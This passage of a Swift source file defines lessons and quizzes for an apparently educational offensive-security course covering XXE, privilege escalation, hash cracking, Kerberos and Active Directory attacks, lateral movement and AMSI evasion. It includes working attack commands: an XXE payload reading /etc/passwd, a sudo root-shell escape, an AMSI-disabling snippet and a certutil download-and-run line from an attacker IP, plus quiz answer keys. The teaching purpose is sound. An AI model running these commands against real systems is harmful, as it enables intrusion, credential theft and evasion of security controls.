  <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><name>&xxe;</name></root>
<!-- the parser inlines /etc/passwd into the response -->
"""),
            .heading("Insecure deserialization"),
            .paragraph("Serialization turns an object into bytes; deserialization rebuilds it. If an app deserializes attacker-controlled bytes with an unsafe library (Java, PHP `unserialize`, Python `pickle`, .NET), an attacker can craft a byte stream that, while being reconstructed, triggers a chain of existing methods (a **gadget chain**) ending in code execution — `ysoserial` automates building these."),
            .keyPoints([
                "SSTI — probe with {{7*7}}; a rendered 49 means the engine evaluates input → RCE.",
                "XXE — supply XML with an external entity to read files or pivot via SSRF.",
                "Deserialization — never deserialize untrusted data; gadget chains turn it into RCE.",
                "All three are 'data becomes code'. Fix: pass user input as data, sandbox/disable dangerous features, and reject untrusted serialized blobs.",
                "These reward reading source: grep for render-from-string, XML parser config, and unserialize/pickle/readObject."
            ]),
            .definition(term: "Gadget chain", meaning: "A sequence of methods already present in the target's code (or its libraries) that, when invoked during deserialization, combine to do something dangerous — like executing a command. The vulnerability is unsafe deserialization; the gadget chain is the exploit that rides it."),
            .callout(.danger, "These bugs routinely yield pre-authentication RCE — among the most severe findings possible. A single XML upload or an exposed deserialization endpoint can mean total server compromise with one request."),
            .callout(.tip, "Defenses: SSTI — render templates with a fixed template and pass user data as context variables, never concatenate. XXE — disable DOCTYPE/external entities in the parser. Deserialization — use data-only formats (JSON) and never deserialize untrusted input into live objects."),
            .checkpoint(QuizQuestion(
                "You enter `{{7*7}}` into a feedback field and the page displays `49`. What have you most likely found?",
                options: [
                    "A math feature",
                    "Server-Side Template Injection — the engine is evaluating your input, a path to RCE",
                    "Reflected XSS",
                    "A SQL injection"
                ],
                correct: 1,
                why: "Rendering 49 proves the template engine evaluated `7*7` from your input. That means you can supply expressions the engine runs server-side — SSTI, which typically escalates to remote code execution."))
        ],
        quiz: [
            QuizQuestion(
                "What underlying mistake do SSTI, XXE and insecure deserialization all share?",
                options: [
                    "Weak passwords",
                    "Untrusted user input is handed to a powerful engine that interprets it as code/instructions",
                    "Missing HTTPS",
                    "Slow database queries"
                ],
                correct: 1,
                why: "All three feed attacker-controlled data into something that evaluates it — a template engine, XML parser, or deserializer — collapsing the line between data and code."),
            QuizQuestion(
                "An XXE payload defines an external entity pointing at `file:///etc/passwd`. What is it abusing?",
                options: [
                    "The browser's DOM",
                    "An XML parser that resolves external entities, inlining local files or reaching internal URLs",
                    "A buffer on the stack",
                    "The TLS handshake"
                ],
                correct: 1,
                why: "XXE abuses XML external-entity resolution: a permissive parser fetches the referenced file or URL, enabling file disclosure and SSRF. The fix is disabling DOCTYPE/external entities."),
            QuizQuestion(
                "What is the safest rule for serialized data from a user?",
                options: [
                    "Deserialize it, then validate",
                    "Never deserialize untrusted data into live objects — prefer data-only formats like JSON",
                    "Encrypt it first, then deserialize",
                    "Only deserialize on Tuesdays"
                ],
                correct: 1,
                why: "Unsafe deserializers can be driven to execute code while rebuilding objects. Treat serialized input as hostile: use data-only formats and validate, rather than reconstructing arbitrary objects.")
        ]
    )

    private static let post = Module(
        id: "red-post",
        title: "Post-Exploitation",
        summary: "You have a shell — now become root, and turn captured hashes into plaintext passwords.",
        systemImage: "arrow.up.forward.app.fill",
        lessons: [privescLesson, crackingLesson]
    )

    private static let privescLesson = Lesson(
        id: "red-privesc",
        title: "Privilege Escalation",
        subtitle: "Climb from a low-privilege foothold to root / SYSTEM.",
        minutes: 12,
        difficulty: .advanced,
        blocks: [
            .heading("Low shell to total control"),
            .paragraph("You almost never land as root. Privilege escalation is the methodical hunt for a misconfiguration or vulnerability that lifts you from a service account to full administrative control. It's a game of enumeration: the box already contains the path up — you have to find it."),
            .animation(.privilegeEscalation, caption: "Climb the ladder from www-data to root: each rung is a real misconfiguration — SUID binary, sudo rule, writable cron, kernel exploit."),
            .heading("Linux paths"),
            .keyPoints([
                "Misconfigured sudo — `sudo -l` shows commands you can run as root (GTFOBins turns many into a root shell).",
                "SUID binaries — programs that run as their owner; an exploitable SUID-root binary = root.",
                "Writable cron jobs / scripts run by root — overwrite, wait, win.",
                "Kernel exploits — an outdated kernel (e.g. DirtyCow) when nothing else works.",
                "Credentials lying around — config files, history, .env, backups."
            ]),
            .terminal(prompt: "www-data@victim",
                      command: "sudo -l",
                      output: """
User www-data may run the following commands on victim:
    (root) NOPASSWD: /usr/bin/find
# find has a known GTFOBins technique:
sudo find . -exec /bin/sh \\; -quit   →  # id → uid=0(root)
"""),
            .heading("Windows paths"),
            .keyPoints([
                "Token / privilege abuse — SeImpersonate (PrintSpoofer, Potato attacks) → SYSTEM.",
                "Unquoted service paths & weak service permissions.",
                "AlwaysInstallElevated, stored credentials, DPAPI secrets.",
                "Tools: winPEAS / linPEAS automate the enumeration checklist."
            ]),
            .callout(.tip, "When stuck, run an automated enumeration script (linPEAS/winPEAS) and read every highlighted line. 90% of privesc is noticing the one misconfiguration you overlooked."),
            .checkpoint(QuizQuestion(
                "`sudo -l` reveals you can run `/usr/bin/find` as root with NOPASSWD. Why is that a privilege-escalation win?",
                options: [
                    "find can search for the root password",
                    "find can execute commands (-exec), so you can spawn a root shell",
                    "It isn't — find is harmless",
                    "It deletes the sudo log"
                ],
                correct: 1,
                why: "find's -exec runs arbitrary commands. Running it as root lets you exec /bin/sh as root — a textbook GTFOBins escalation."))
        ],
        quiz: [
            QuizQuestion(
                "A SUID binary owned by root runs with whose privileges when you execute it?",
                options: ["Your own", "root's (the owner's)", "Nobody's", "The kernel's"],
                correct: 1,
                why: "The SUID bit makes a program run as its owner regardless of who launches it. A flawed SUID-root binary therefore executes your influence as root."),
            QuizQuestion(
                "What do linPEAS / winPEAS do?",
                options: [
                    "Exploit the kernel automatically",
                    "Automate enumeration, surfacing likely privilege-escalation vectors",
                    "Crack passwords",
                    "Open a reverse shell"
                ],
                correct: 1,
                why: "They run a huge checklist of local checks and highlight misconfigurations and credentials worth investigating — they enumerate, they don't auto-exploit.")
        ]
    )

    private static let crackingLesson = Lesson(
        id: "red-cracking",
        title: "Password Attacks & Cracking",
        subtitle: "Turn captured hashes into plaintext — offline, at billions of guesses per second.",
        minutes: 11,
        difficulty: .advanced,
        blocks: [
            .heading("Online vs offline"),
            .paragraph("Online attacks guess against a live service (slow, noisy, lockout-prone). The real power is **offline** cracking: once you've looted password hashes — from /etc/shadow, a SAM dump, or a database — you attack them on your own hardware with no rate limit and no one watching."),
            .animation(.passwordCracking, caption: "A wordlist streams through a hash function; each candidate's digest is compared to the stolen hash until one matches."),
            .terminal(prompt: "kali@lab",
                      command: "hashcat -m 1800 hashes.txt rockyou.txt -r best64.rule",
                      output: """
$6$xy...$Q9... : Summer2024!
Recovered......: 1/1 (100.00%)
Speed.#1.......: 12834 H/s   (sha512crypt — deliberately slow)
"""),
            .keyPoints([
                "Dictionary attack — try a wordlist (rockyou.txt) of known/leaked passwords.",
                "Rules — mutate words (Password → P@ssw0rd!) to multiply coverage cheaply.",
                "Mask/brute force — try character patterns when you know the structure.",
                "hashcat (GPU) and John the Ripper are the standard crackers; the mode (-m) must match the hash type."
            ]),
            .definition(term: "Password spraying", meaning: "An online attack that flips brute force around: try ONE common password (e.g. Spring2024!) against MANY accounts. It stays under per-account lockout thresholds — a top cause of corporate breaches."),
            .callout(.warning, "Cracking speed depends entirely on the hash. Fast hashes (NTLM, MD5) fall at billions/sec on a GPU; slow ones (bcrypt, sha512crypt) at thousands/sec. This is why the Fundamentals lesson insisted on slow hashes."),
            .checkpoint(QuizQuestion(
                "Why is offline cracking so much more dangerous than online guessing?",
                options: [
                    "It works on any password instantly",
                    "There's no rate limiting, lockout, or logging — you guess at full hardware speed",
                    "It doesn't need the hash",
                    "It only works on Windows"
                ],
                correct: 1,
                why: "Once you hold the hashes, you attack them locally with no service in the loop — no lockouts, no logs, and GPU speeds. Defenses like lockout only apply to online attempts."))
        ],
        quiz: [
            QuizQuestion(
                "Password spraying avoids account lockouts by…",
                options: [
                    "Trying many passwords against one account",
                    "Trying one common password against many accounts",
                    "Disabling the lockout policy",
                    "Using a faster hash"
                ],
                correct: 1,
                why: "By testing a single password across many users, the attempts-per-account stay below lockout thresholds while still hitting whoever reused that weak password."),
            QuizQuestion(
                "What's the purpose of a rules file like best64 in hashcat?",
                options: [
                    "It encrypts the wordlist",
                    "It mutates dictionary words (capitalization, leetspeak, appending digits) to expand coverage",
                    "It sorts the hashes",
                    "It picks the hash mode automatically"
                ],
                correct: 1,
                why: "Rules transform each wordlist entry into many realistic variants (Password → P@ssw0rd123), dramatically increasing hits at little cost.")
        ]
    )

    // MARK: R5 — Active Directory & lateral movement

    private static let activeDirectory = Module(
        id: "red-ad",
        title: "Active Directory & Lateral Movement",
        summary: "The corporate battleground — roast Kerberos, replicate the DC's secrets, map attack paths to Domain Admin, then spread host to host.",
        systemImage: "person.3.fill",
        lessons: [kerberoastLesson, adAttacksLesson, bloodhoundLesson, lateralLesson]
    )

    private static let kerberoastLesson = Lesson(
        id: "red-kerberoasting",
        title: "Kerberoasting",
        subtitle: "Ask the domain for a ticket, then crack a service account's password offline.",
        minutes: 11,
        difficulty: .expert,
        blocks: [
            .heading("Abusing how Kerberos works by design"),
            .paragraph("In Active Directory, any authenticated user can request a service ticket (TGS) for any service account (one with a Service Principal Name). Part of that ticket is encrypted with the service account's password hash. Kerberoasting requests those tickets and cracks them **offline** — no exploit, just a feature used against itself. Service accounts often have weak, never-expiring passwords, making them prime targets."),
            .animation(.kerberoasting, caption: "A normal user asks the KDC for a service ticket; the returned TGS is encrypted with the service account's hash — extract it and crack offline."),
            .terminal(prompt: "kali@lab",
                      command: "GetUserSPNs.py CORP/jdoe:Passw0rd -dc-ip 10.10.10.10 -request",
                      output: """
ServicePrincipalName     Name        MemberOf
-----------------------  ----------  ----------------
MSSQLSvc/sql01.corp:1433 svc_mssql   Domain Admins
$krb5tgs$23$*svc_mssql$CORP$...   <-- crackable hash
"""),
            .terminal(prompt: "kali@lab",
                      command: "hashcat -m 13100 spns.txt rockyou.txt",
                      output: """
$krb5tgs$23$*svc_mssql...  :  Summer2023!
# svc_mssql is in Domain Admins → game over
"""),
            .keyPoints([
                "Needs only ONE valid domain account — no special privileges to request tickets.",
                "Targets service accounts (SPNs); these often have weak, stale passwords.",
                "Cracking is entirely offline → no failed-logon noise on the DC.",
                "A kerberoasted account that's over-privileged (Domain Admin) is instant escalation."
            ]),
            .callout(.tip, "Blue-team defenses: give service accounts long random passwords (use Group Managed Service Accounts), keep them out of privileged groups, and alert on a single account requesting many TGS tickets (event 4769) with RC4 encryption."),
            .checkpoint(QuizQuestion(
                "What makes Kerberoasting possible without exploiting any bug?",
                options: [
                    "A flaw in Windows that Microsoft refuses to patch",
                    "By design any domain user can request service tickets, part of which is encrypted with the service account's password hash",
                    "Stolen Domain Admin credentials",
                    "Physical access to the domain controller"
                ],
                correct: 1,
                why: "It abuses normal Kerberos behavior: service tickets are issued to any authenticated user and contain material encrypted with the service account's hash, which can then be cracked offline."))
        ],
        quiz: [
            QuizQuestion(
                "Why is cracking a kerberoasted ticket done offline rather than against the DC?",
                options: [
                    "The DC is too fast",
                    "The crackable hash is inside the ticket you already hold, so no further DC interaction (or logging) is needed",
                    "Kerberos blocks online cracking",
                    "It must be done online"
                ],
                correct: 1,
                why: "Once you have the TGS, the encrypted blob is yours to attack locally at GPU speed — silent, with no failed-authentication events on the domain controller."),
            QuizQuestion(
                "Which control most directly defangs Kerberoasting?",
                options: [
                    "Disabling Kerberos entirely",
                    "Long, random, regularly-rotated service-account passwords (e.g. gMSAs)",
                    "Blocking port 88 from all clients",
                    "Renaming service accounts"
                ],
                correct: 1,
                why: "Since the attack ends in offline cracking, a 25+ character random password (as gMSAs provide automatically) makes the recovered hash effectively uncrackable.")
        ]
    )

    private static let adAttacksLesson = Lesson(
        id: "red-ad-attacks",
        title: "AS-REP Roasting, DCSync & Golden Tickets",
        subtitle: "Turn Kerberos and AD replication against the domain — from a single account to forging tickets as anyone.",
        minutes: 13,
        difficulty: .expert,
        blocks: [
            .heading("Abusing the protocol, not a bug"),
            .paragraph("Active Directory's most powerful attacks aren't exploits — they're the protocol working as designed, aimed the wrong way. Kerberoasting (last lesson) cracked service tickets. This lesson chains the rest of the classic kill chain: harvest crackable hashes without even a password, then — once you have high privilege — replicate the DC's secrets and forge tickets that never expire."),
            .heading("AS-REP Roasting — no password required"),
            .paragraph("Normally Kerberos pre-authentication proves you know a password before the DC sends anything crackable. But accounts with **'Do not require Kerberos pre-authentication'** set will hand the AS-REP — encrypted with the user's password hash — to *anyone* who asks. Request it, crack it offline. You don't even need a domain account to try named users."),
            .terminal(prompt: "kali@lab",
                      command: "GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.10.10.10",
                      output: """
[*] svc_backup  doesn't require pre-auth
$krb5asrep$23$svc_backup@CORP.LOCAL:6f2a...   <-- crackable offline
"""),
            .heading("DCSync — stealing every hash by asking nicely"),
            .paragraph("Domain Controllers replicate changes to each other over the **DRSUAPI** protocol. Any account holding the replication rights (Domain Admins, or anyone granted *Replicating Directory Changes*) can pretend to be a DC and ask a real DC for any user's password hash — including **krbtgt**, the account whose hash signs every Kerberos ticket. No code runs on the DC; it just answers a legitimate request."),
            .terminal(prompt: "kali@lab",
                      command: "secretsdump.py corp.local/admin@10.10.10.10 -just-dc-user krbtgt",
                      output: """
krbtgt:502:aad3b...:8a3b1f9d...:::    <-- the key to the kingdom
[*] Kerberos keys grabbed
"""),
            .animation(.dcsync, caption: "An attacker with replication rights asks the DC for the krbtgt hash, then uses it to forge a Golden Ticket valid as any user, indefinitely."),
            .heading("Golden & Silver tickets — forging trust"),
            .paragraph("With the **krbtgt** hash you can forge a **Golden Ticket**: a self-made TGT for any user (say, a fake Domain Admin), accepted by the whole domain because it's signed by krbtgt itself. A **Silver Ticket** forges a service ticket for one service using that service account's hash — stealthier, since it never touches the DC. Golden tickets survive password resets of the victim user and persist until krbtgt is rotated *twice*."),
            .keyPoints([
                "AS-REP Roasting — target accounts without pre-auth; crack the AS-REP offline (hashcat -m 18200).",
                "DCSync — abuse replication rights to pull any hash, especially krbtgt (impacket secretsdump).",
                "Golden Ticket — forge a TGT as anyone using krbtgt; domain-wide, long-lived persistence.",
                "Silver Ticket — forge a service ticket with a service hash; stealthy, no DC contact.",
                "These are post-compromise: AS-REP needs almost nothing; DCSync/Golden need high privilege first."
            ]),
            .definition(term: "krbtgt account", meaning: "The hidden domain account whose password hash signs every Kerberos TGT. Possessing its hash lets you mint valid tickets for anyone — which is why a Golden Ticket is so devastating and why incident response after one means rotating krbtgt twice."),
            .callout(.tip, "Blue team: alert on DCSync from non-DC hosts (replication events 4662 with the DRS GUID), flag accounts without pre-auth, give service accounts gMSAs, and treat a krbtgt rotation as a core part of recovering from domain compromise."),
            .callout(.danger, "A Golden Ticket is persistence that ordinary remediation misses — resetting the compromised user's password does nothing. The domain isn't clean until krbtgt is rotated twice and the replication rights that enabled DCSync are removed."),
            .checkpoint(QuizQuestion(
                "Why does stealing the krbtgt hash let an attacker forge a Golden Ticket for any user?",
                options: [
                    "krbtgt is the Administrator account",
                    "The krbtgt hash signs all Kerberos TGTs, so a ticket you sign with it is accepted as genuine domain-wide",
                    "It decrypts the network",
                    "It disables authentication"
                ],
                correct: 1,
                why: "Every TGT is encrypted/signed with the krbtgt hash. Holding that hash lets you mint a TGT claiming to be anyone, and the domain trusts it because the signature is valid."))
        ],
        quiz: [
            QuizQuestion(
                "What makes an account vulnerable to AS-REP Roasting?",
                options: [
                    "It is a Domain Admin",
                    "Kerberos pre-authentication is disabled, so the DC sends a crackable AS-REP to anyone",
                    "It has a long password",
                    "It is disabled"
                ],
                correct: 1,
                why: "With pre-auth off, the DC returns the AS-REP (encrypted with the user's hash) without proof of knowledge — letting an attacker request and crack it offline."),
            QuizQuestion(
                "What does DCSync abuse to obtain password hashes?",
                options: [
                    "A buffer overflow in the DC",
                    "Legitimate directory-replication rights (DRSUAPI), impersonating a DC to request hashes",
                    "Physical access to the server",
                    "A phishing email"
                ],
                correct: 1,
                why: "DCSync uses the normal replication protocol. An account with replication rights asks a DC for hashes and the DC complies — no exploit, no code execution on the DC."),
            QuizQuestion(
                "After a confirmed Golden Ticket attack, what must happen to truly evict the attacker?",
                options: [
                    "Reset the victim user's password",
                    "Rotate the krbtgt account's password twice",
                    "Reboot the workstations",
                    "Change the firewall rules"
                ],
                correct: 1,
                why: "Golden Tickets are signed by krbtgt and ignore user password resets. Only rotating krbtgt (twice, due to how two password versions are honored) invalidates forged tickets.")
        ]
    )

    private static let bloodhoundLesson = Lesson(
        id: "red-bloodhound",
        title: "Attack Paths & ACL Abuse",
        subtitle: "BloodHound turns a maze of AD permissions into a graph — and a shortest path to Domain Admin.",
        minutes: 11,
        difficulty: .expert,
        blocks: [
            .heading("AD is a graph, and graphs have paths"),
            .paragraph("A big domain has thousands of users, groups, computers and the permissions binding them. Hidden in that tangle is almost always a chain — *you* can reset *this* group's members, that group is admin on *this* server, where a Domain Admin has a live session — that leads from your low-privileged account to total control. **BloodHound** collects this data and renders it as a graph, then literally computes the shortest path to Domain Admin."),
            .animation(.attackPath, caption: "Each edge is a real AD permission — MemberOf, AdminTo, HasSession — lighting up a chain from a normal user to Domain Admins."),
            .terminal(prompt: "kali@lab",
                      command: "bloodhound-python -u jdoe -p Passw0rd -d corp.local -c All",
                      output: """
INFO: Found 1452 users, 311 groups, 88 computers
INFO: Compressed data written to 20260611_bloodhound.zip
# import to BloodHound → 'Shortest Path to Domain Admins'
"""),
            .heading("ACL abuse — permissions as exploits"),
            .paragraph("Many edges are **ACLs** — access-control entries on AD objects. They're not bugs; they're misconfigurations admins didn't realize were dangerous. Each is a concrete attack: `GenericAll` over a user lets you reset their password; `WriteDACL` lets you grant yourself rights; `ForceChangePassword` is exactly what it sounds like; control of a group adds you to it; `WriteOwner` makes you the owner. Tools like **PowerView**/**Impacket** turn each edge into a one-liner."),
            .keyPoints([
                "GenericAll / GenericWrite — full or broad control of a target object (reset passwords, set SPNs).",
                "WriteDACL / WriteOwner — rewrite an object's permissions, then grant yourself more.",
                "ForceChangePassword — set a user's password without knowing the old one.",
                "AddMember — control a group → add yourself → inherit its rights.",
                "HasSession — a privileged user's session on a box you control = stealable credentials.",
                "DCSync edge — replication rights surfaced as a direct path to every hash."
            ]),
            .definition(term: "Access Control Entry (ACE)", meaning: "A single permission on an AD object (who can do what to it). The collection is the object's ACL. Attackers hunt over-permissive ACEs — like a help-desk group with GenericAll on executives — because each is a direct, supported way to take control."),
            .callout(.tip, "BloodHound is just as powerful for the blue team: run it on your own domain to find and prune the dangerous paths before an attacker maps them. 'Shortest path to Domain Admins' coming back empty is a real defensive win."),
            .callout(.warning, "Attack paths bypass patching entirely. A fully-updated domain where a forgotten ACL lets a normal user reset a Domain Admin's password is one command from compromise. Permissions, not CVEs, decide most internal engagements."),
            .checkpoint(QuizQuestion(
                "BloodHound shows you have `ForceChangePassword` over the account `sql_admin`, which is a Domain Admin. What can you do?",
                options: [
                    "Nothing without sql_admin's current password",
                    "Reset sql_admin's password without knowing the old one, then log in as a Domain Admin",
                    "Only read sql_admin's email",
                    "Crash the domain controller"
                ],
                correct: 1,
                why: "ForceChangePassword lets you set a new password for the target without the current one. If that target is a Domain Admin, you've just taken over the domain — no exploit required."))
        ],
        quiz: [
            QuizQuestion(
                "What does BloodHound fundamentally do?",
                options: [
                    "Cracks password hashes",
                    "Collects AD objects and permissions and graphs the privilege paths to high-value targets",
                    "Scans for open ports",
                    "Encrypts the domain"
                ],
                correct: 1,
                why: "BloodHound ingests users, groups, computers and their relationships and visualizes attack paths — most famously the shortest path to Domain Admins."),
            QuizQuestion(
                "Why are ACL-based attack paths so dangerous even in a fully-patched domain?",
                options: [
                    "They exploit unpatched CVEs",
                    "They abuse legitimate, misconfigured permissions — no vulnerability to patch, just rights to misuse",
                    "They only work with physical access",
                    "They require Domain Admin already"
                ],
                correct: 1,
                why: "ACL abuse rides supported permissions. Patching doesn't touch it; the fix is tightening over-permissive rights — which is exactly what BloodHound helps defenders find."),
            QuizQuestion(
                "Having `GenericAll` over a group most directly lets an attacker…",
                options: [
                    "Add themselves to the group and inherit its privileges",
                    "Read the group's description",
                    "Delete the domain",
                    "Bypass MFA"
                ],
                correct: 0,
                why: "GenericAll is full control of the object. Over a group, that includes modifying membership — add yourself and you gain whatever rights the group holds.")
        ]
    )

    private static let lateralLesson = Lesson(
        id: "red-lateral",
        title: "Pivoting & Lateral Movement",
        subtitle: "Use one compromised host as a springboard to reach the rest of the network.",
        minutes: 10,
        difficulty: .expert,
        blocks: [
            .heading("One box is a doorway, not the goal"),
            .paragraph("Rarely is your first foothold the crown jewels. Lateral movement is the art of reusing credentials and trust to hop from host to host, and **pivoting** is tunneling your tools *through* a compromised machine to reach networks you can't touch directly. Together they turn a single shell into domain-wide reach."),
            .animation(.lateralMovement, caption: "From a foothold, harvested credentials unlock the next host, then the next — a pivot tunnel routes traffic into a hidden internal subnet."),
            .keyPoints([
                "Pass-the-Hash — authenticate with an NTLM hash without ever cracking it.",
                "Pass-the-Ticket — reuse a stolen Kerberos ticket.",
                "Remote execution — PsExec, WMI, WinRM, SMB to run commands on the next host.",
                "Pivoting — SSH tunnels, Chisel, or Metasploit routes to reach internal-only subnets.",
                "Credential reuse — the same local-admin password across machines is the classic spread vector."
            ]),
            .terminal(prompt: "kali@lab",
                      command: "crackmapexec smb 10.10.10.0/24 -u admin -H aad3b...:31d6cfe0...",
                      output: """
SMB  10.10.10.21  [+] CORP\\admin (Pwn3d!)   <-- hash works here too
SMB  10.10.10.22  [+] CORP\\admin (Pwn3d!)
SMB  10.10.10.10  [+] CORP\\admin (Pwn3d!)   <-- domain controller
"""),
            .definition(term: "Pass-the-Hash (PtH)", meaning: "NTLM authentication proves you know the password's hash, not the password. So a stolen hash is as good as the password — you 'pass' it directly, no cracking required. This is why hash theft is catastrophic."),
            .callout(.tip, "Blue team: a flat network where one local-admin password unlocks everything is the dream scenario for lateral movement. LAPS (unique local-admin passwords), network segmentation, and tiered admin accounts break the chain."),
            .checkpoint(QuizQuestion(
                "Pass-the-Hash works because NTLM authentication…",
                options: [
                    "Sends the plaintext password",
                    "Proves knowledge of the password's hash, so the hash alone is sufficient to authenticate",
                    "Requires a smart card",
                    "Only works locally"
                ],
                correct: 1,
                why: "NTLM uses the hash as the secret. Possessing the hash lets you authenticate without ever knowing or cracking the plaintext — hence 'passing' the hash."))
        ],
        quiz: [
            QuizQuestion(
                "What problem does pivoting solve?",
                options: [
                    "Cracking passwords faster",
                    "Reaching internal networks/hosts that aren't directly routable from the attacker",
                    "Encrypting traffic",
                    "Bypassing MFA"
                ],
                correct: 1,
                why: "Pivoting tunnels traffic through a compromised host to access segments the attacker can't reach directly, extending their reach into the internal network."),
            QuizQuestion(
                "Which control most directly stops a single reused local-admin password from enabling network-wide lateral movement?",
                options: [
                    "Antivirus",
                    "LAPS (unique, rotated local-admin passwords per machine)",
                    "A longer screensaver timeout",
                    "Disabling Kerberos"
                ],
                correct: 1,
                why: "LAPS gives every machine a unique, random local-admin password, so compromising one host's hash no longer unlocks the rest.")
        ]
    )

    // MARK: R6 — Evasion & defense bypass

    private static let evasion = Module(
        id: "red-evasion",
        title: "Evasion & Defense Bypass",
        summary: "Modern endpoints fight back — get past antivirus, AMSI and EDR, and run code where the defenders aren't looking.",
        systemImage: "eye.slash.fill",
        lessons: [avEvasionLesson, processInjectionLesson]
    )

    private static let avEvasionLesson = Lesson(
        id: "red-av-evasion",
        title: "Antivirus, AMSI & EDR Evasion",
        subtitle: "The OSEP mindset — assume the endpoint is watching, and slip your payload past it.",
        minutes: 12,
        difficulty: .expert,
        blocks: [
            .heading("The defended endpoint"),
            .paragraph("The tidy exploits of earlier lessons assume a target that isn't watching. Real corporate machines run layered defenses: signature antivirus, Microsoft's **AMSI** scanning scripts as they run, and **EDR** hooking the OS to spot malicious behavior. Evasion — the core of OffSec's OSEP — is the craft of getting code to run anyway. It's a cat-and-mouse game, and the operator who understands *how* detection works wins it."),
            .heading("Three layers, three problems"),
            .keyPoints([
                "Static AV — matches known byte signatures on disk. Beaten by obfuscation, encryption and unique payloads.",
                "AMSI — lets PowerShell/.NET/VBA submit script content to AV at runtime, defeating fileless and obfuscated scripts.",
                "EDR — hooks API calls and watches behavior (process injection, lsass access, odd parent/child) — the hardest to beat.",
                "Signatures catch the known; behavior catches the novel. Modern evasion must answer both."
            ]),
            .animation(.amsiBypass, caption: "A payload AMSI would block runs clean once the attacker patches AmsiScanBuffer in the current process's memory."),
            .heading("Bypassing AMSI"),
            .paragraph("AMSI runs *in your own process*, which is its weakness: code you control can neuter it. The classic technique patches `AmsiScanBuffer` in memory so every scan returns 'clean', or sets the `amsiInitFailed` flag so initialization is skipped. Because it's an in-process change, it leaves little on disk — but EDR increasingly watches for the patch itself."),
            .terminal(prompt: "PS C:\\>",
                      command: "# conceptual: neuter AMSI for this process, then load tooling\n$a=[Ref].Assembly.GetType('...AmsiUtils'); $f=$a.GetField('amsiInitFailed','NonPublic,Static')",
                      output: """
$f.SetValue($null,$true)
# AMSI now reports clean for this session → in-memory tooling loads
"""),
            .heading("Beyond AV: defeating behavior"),
            .paragraph("Static evasion is the easy half. Against EDR you change *behavior*: run in memory instead of dropping files, abuse trusted signed binaries (**LOLBins** — next lesson), make direct/indirect syscalls to skip userland API hooks, and shape C2 traffic to look ordinary. The goal isn't invisibility — it's looking enough like normal activity that nothing crosses an alerting threshold."),
            .definition(term: "AMSI (Antimalware Scan Interface)", meaning: "A Windows interface that lets scripting engines and apps submit content to the installed AV for scanning at execution time — even code that only ever exists in memory. It closed the 'fileless script' blind spot, which is why attackers target it first."),
            .callout(.danger, "Evasion is exclusively for authorized engagements that scope it. Developing or deploying detection-evasion against systems you don't have explicit written permission to test is exactly the line the Ethics lesson draws — and crossing it is a crime, not a flex."),
            .callout(.tip, "Blue team: an AMSI bypass is itself a high-fidelity detection. Hunt for in-memory patches of amsi.dll, the telltale reflection strings, and PowerShell that loads assemblies right after touching AmsiUtils. Script Block Logging and AMSI capture the attempt even when the bypass succeeds."),
            .checkpoint(QuizQuestion(
                "Why is AMSI uniquely vulnerable to being bypassed from within a malicious script's own process?",
                options: [
                    "It runs on the domain controller",
                    "It executes inside the same process as the code it scans, so code that controls that process can patch it to return 'clean'",
                    "It has no password",
                    "It only scans files on disk"
                ],
                correct: 1,
                why: "AMSI evaluates content in-process. An attacker who already runs code there can modify AMSI's own memory (e.g. AmsiScanBuffer) so it reports everything clean — the bypass and the payload share the process."))
        ],
        quiz: [
            QuizQuestion(
                "What does AMSI add over traditional on-disk antivirus?",
                options: [
                    "It encrypts the disk",
                    "Runtime scanning of script/in-memory content, catching fileless and obfuscated code",
                    "It blocks network traffic",
                    "It cracks passwords"
                ],
                correct: 1,
                why: "AMSI lets engines submit what they're about to execute — including memory-only scripts — to AV at runtime, closing the gap that pure on-disk signature scanning left open."),
            QuizQuestion(
                "Against EDR, why is changing behavior more important than just changing signatures?",
                options: [
                    "EDR ignores signatures entirely",
                    "EDR watches actions (injection, lsass access, anomalous process trees), so a novel-but-malicious behavior still alerts",
                    "Signatures are illegal",
                    "Behavior can't be detected"
                ],
                correct: 1,
                why: "EDR is behavior-centric. A payload with a brand-new signature still trips detections if it acts maliciously — so evasion has to address what the code does, not just how it looks."),
            QuizQuestion(
                "From the defender's view, an AMSI bypass attempt is…",
                options: [
                    "Undetectable",
                    "A strong detection opportunity — the bypass technique itself is a high-fidelity signal",
                    "Proof the network is safe",
                    "Only relevant to Linux"
                ],
                correct: 1,
                why: "The reflection calls and in-memory patching used to disable AMSI are distinctive. Script Block Logging and memory monitoring make the bypass attempt itself a reliable alert.")
        ]
    )

    private static let processInjectionLesson = Lesson(
        id: "red-process-injection",
        title: "Process Injection & Living Off the Land",
        subtitle: "Run your code inside trusted processes, using the tools already on the box.",
        minutes: 11,
        difficulty: .expert,
        blocks: [
            .heading("Don't bring tools — borrow them"),
            .paragraph("Dropping `mimikatz.exe` on a modern endpoint gets you caught. Two ideas dominate stealthy post-exploitation: **process injection** (run your code inside a process that's already trusted and running) and **living off the land** (use the legitimate, signed binaries already on the system so nothing foreign appears at all)."),
            .heading("Process injection"),
            .paragraph("Classic injection allocates memory in a target process, writes shellcode into it, and starts a thread there — so the malicious code executes under the identity and reputation of, say, `explorer.exe`. EDR watches the very APIs this uses (`VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`), so operators reach for stealthier variants: thread hijacking, APC injection, process hollowing, and module stomping."),
            .animation(.processInjection, caption: "A loader allocates memory in trusted explorer.exe, writes shellcode, and starts a remote thread — so the beacon phones home as explorer."),
            .definition(term: "Process hollowing", meaning: "Start a legitimate process (e.g. svchost.exe) suspended, carve out its real code from memory, replace it with malicious code, then resume it. The process keeps its trusted name and path on disk while running the attacker's payload."),
            .heading("Living off the land (LOLBins)"),
            .paragraph("A **LOLBin** is a signed, built-in Windows binary repurposed for attacker goals — so the activity is just 'Windows being Windows'. `certutil` downloads files, `rundll32`/`regsvr32` execute code, `mshta` runs HTA scripts, `wmic` and `bitsadmin` run and fetch. Because these are trusted and ubiquitous, signature AV won't flag them; only behavioral context gives them away."),
            .terminal(prompt: "C:\\>",
                      command: "certutil -urlcache -split -f http://10.10.14.3/a.exe a.exe & rundll32 a.dll,Start",
                      output: """
****  Online  ****
CertUtil: -URLCache command completed successfully.
# a signed Microsoft binary just downloaded the payload — no 'malware' ran
"""),
            .keyPoints([
                "Injection — run code inside a trusted process to inherit its identity and dodge file-based detection.",
                "Variants — thread hijack, APC, process hollowing, module stomping evade the obvious inject APIs.",
